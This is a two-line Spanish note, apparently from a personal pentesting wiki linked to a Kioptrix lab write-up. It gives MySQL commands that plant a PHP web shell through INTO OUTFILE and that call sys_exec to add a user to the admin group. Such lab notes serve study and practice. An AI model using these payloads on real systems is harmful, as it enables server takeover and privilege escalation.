Usado en [[KioptrixLvl1.3-4]]
```sql
mysql> SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/shell.php';
```

```sql
mysql> select sys_exec('usermod -aG admin alexi');
```